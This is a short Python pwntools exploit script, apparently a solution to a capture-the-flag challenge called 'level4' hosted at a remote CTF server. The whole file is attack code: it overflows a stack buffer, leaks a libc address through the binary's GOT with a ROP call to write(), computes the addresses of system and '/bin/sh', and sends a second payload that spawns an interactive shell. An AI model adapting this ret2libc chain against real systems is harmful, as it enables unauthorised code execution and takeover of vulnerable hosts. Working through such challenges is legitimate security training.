from pwn import *
from LibcSearcher import *
#p=process('./level4')
p=remote('pwn2.jarvisoj.com',9880)
e=ELF('./level4')
libc_start_main_got=e.got['__libc_start_main']
write_plt=e.plt['write']
vul_addr=e.symbols['vulnerable_function']
payload1='a'*(0x88+0x4)+p32(write_plt)+p32(vul_addr)+p32(1)+p32(libc_start_main_got)+p32(4)
p.sendline(payload1)
temp=p.recv(4)
libc_start_main_addr=u32(temp[0:4])
print (libc_start_main_addr)
libc=LibcSearcher('__libc_start_main',libc_start_main_addr)
libcbase=libc_start_main_addr-libc.dump('__libc_start_main')
sys_addr=libcbase+libc.dump('system')
#print (sys_addr)
binsh_addr=libcbase+libc.dump('str_bin_sh')
#print (binsh_addr)
payload2='a'*(0x88+0x4)+p32(sys_addr)+'aaaa'+p32(binsh_addr)
p.sendline(payload2)
p.interactive()

